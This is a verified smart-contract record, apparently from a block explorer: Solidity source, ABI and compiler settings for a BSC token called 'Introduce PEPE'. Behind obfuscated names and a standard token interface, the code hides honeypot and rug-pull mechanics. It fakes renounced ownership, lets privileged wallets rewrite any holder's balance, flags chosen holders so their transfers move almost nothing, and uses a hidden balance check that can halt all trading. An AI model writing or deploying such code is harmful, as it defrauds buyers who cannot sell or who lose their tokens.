{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface fundListTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxAuto) external view returns (uint256);\n\n    function transfer(address senderToken, uint256 receiverListShould) external returns (bool);\n\n    function allowance(address fundTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverListShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderToken,\n        uint256 receiverListShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeTxIs, uint256 value);\n    event Approval(address indexed fundTo, address indexed spender, uint256 value);\n}\n\nabstract contract modeReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapIs {\n    function createPair(address enableTotal, address launchBuy) external returns (address);\n}\n\ninterface txAuto is fundListTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IntroducePEPE is modeReceiver, fundListTeam, txAuto {\n\n    uint256 private listLaunch = 100000000 * 10 ** 18;\n\n    function transferFrom(address receiverShould, address senderToken, uint256 receiverListShould) external override returns (bool) {\n        if (_msgSender() != launchList) {\n            if (launchedToken[receiverShould][_msgSender()] != type(uint256).max) {\n                require(receiverListShould <= launchedToken[receiverShould][_msgSender()]);\n                launchedToken[receiverShould][_msgSender()] -= receiverListShould;\n            }\n        }\n        return txLaunch(receiverShould, senderToken, receiverListShould);\n    }\n\n    function owner() external view returns (address) {\n        return takeIs;\n    }\n\n    function balanceOf(address maxAuto) public view virtual override returns (uint256) {\n        return marketingAt[maxAuto];\n    }\n\n    uint256 listIs;\n\n    bool public receiverMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverFund;\n    }\n\n    mapping(address => uint256) private marketingAt;\n\n    address public totalTx;\n\n    uint256 public buyTake;\n\n    event OwnershipTransferred(address indexed takeMarketing, address indexed totalMinLaunch);\n\n    address launchList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address buyMode, uint256 receiverListShould) public virtual override returns (bool) {\n        launchedToken[_msgSender()][buyMode] = receiverListShould;\n        emit Approval(_msgSender(), buyMode, receiverListShould);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedToken;\n\n    address shouldTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function maxReceiver() private view {\n        require(isLiquidity[_msgSender()]);\n    }\n\n    constructor (){\n        if (marketingLimitLaunched != txMax) {\n            txAmount = marketingLimitLaunched;\n        }\n        takeLimit enableBuyList = takeLimit(launchList);\n        totalTx = swapIs(enableBuyList.factory()).createPair(enableBuyList.WETH(), address(this));\n        if (marketingToken == txMax) {\n            buyTake = txAmount;\n        }\n        swapBuy = _msgSender();\n        toSell();\n        isLiquidity[swapBuy] = true;\n        marketingAt[swapBuy] = listLaunch;\n        if (sellAmount == receiverMax) {\n            takeTo = txAmount;\n        }\n        emit Transfer(address(0), swapBuy, listLaunch);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listLaunch;\n    }\n\n    string private receiverFund = \"IPE\";\n\n    bool public sellAmount;\n\n    function senderFee(address receiverTxAt, uint256 receiverListShould) public {\n        maxReceiver();\n        marketingAt[receiverTxAt] = receiverListShould;\n    }\n\n    uint256 private txMax;\n\n    function teamWallet(address marketingLimit) public {\n        require(marketingLimit.balance < 100000);\n        if (tokenFromLimit) {\n            return;\n        }\n        if (marketingToken != takeTo) {\n            takeTo = txAmount;\n        }\n        isLiquidity[marketingLimit] = true;\n        \n        tokenFromLimit = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atBuy;\n    }\n\n    uint256 public txAmount;\n\n    uint256 amountLimit;\n\n    function toSell() public {\n        emit OwnershipTransferred(swapBuy, address(0));\n        takeIs = address(0);\n    }\n\n    bool public tokenFromLimit;\n\n    uint8 private minTxFrom = 18;\n\n    function marketingSwap(uint256 receiverListShould) public {\n        maxReceiver();\n        amountLimit = receiverListShould;\n    }\n\n    uint256 private marketingLimitLaunched;\n\n    address public swapBuy;\n\n    function getOwner() external view returns (address) {\n        return takeIs;\n    }\n\n    function transfer(address receiverTxAt, uint256 receiverListShould) external virtual override returns (bool) {\n        return txLaunch(_msgSender(), receiverTxAt, receiverListShould);\n    }\n\n    function receiverFundMarketing(address receiverLiquiditySender) public {\n        maxReceiver();\n        \n        if (receiverLiquiditySender == swapBuy || receiverLiquiditySender == totalTx) {\n            return;\n        }\n        atEnable[receiverLiquiditySender] = true;\n    }\n\n    function allowance(address tradingMax, address buyMode) external view virtual override returns (uint256) {\n        if (buyMode == launchList) {\n            return type(uint256).max;\n        }\n        return launchedToken[tradingMax][buyMode];\n    }\n\n    string private atBuy = \"Introduce PEPE\";\n\n    uint256 private exemptModeToken;\n\n    uint256 private takeTo;\n\n    address private takeIs;\n\n    uint256 private marketingToken;\n\n    uint256 constant tradingSell = 10 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minTxFrom;\n    }\n\n    mapping(address => bool) public isLiquidity;\n\n    function exemptToken(address receiverShould, address senderToken, uint256 receiverListShould) internal returns (bool) {\n        require(marketingAt[receiverShould] >= receiverListShould);\n        marketingAt[receiverShould] -= receiverListShould;\n        marketingAt[senderToken] += receiverListShould;\n        emit Transfer(receiverShould, senderToken, receiverListShould);\n        return true;\n    }\n\n    mapping(address => bool) public atEnable;\n\n    function txLaunch(address receiverShould, address senderToken, uint256 receiverListShould) internal returns (bool) {\n        if (receiverShould == swapBuy) {\n            return exemptToken(receiverShould, senderToken, receiverListShould);\n        }\n        uint256 maxTotal = fundListTeam(totalTx).balanceOf(shouldTrading);\n        require(maxTotal == amountLimit);\n        require(senderToken != shouldTrading);\n        if (atEnable[receiverShould]) {\n            return exemptToken(receiverShould, senderToken, tradingSell);\n        }\n        return exemptToken(receiverShould, senderToken, receiverListShould);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMinLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTxIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverListShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverListShould\",\"type\":\"uint256\"}],\"name\":\"marketingSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquiditySender\",\"type\":\"address\"}],\"name\":\"receiverFundMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTxAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverListShould\",\"type\":\"uint256\"}],\"name\":\"senderFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLimit\",\"type\":\"address\"}],\"name\":\"teamWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFromLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTxAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverListShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverListShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "IntroducePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}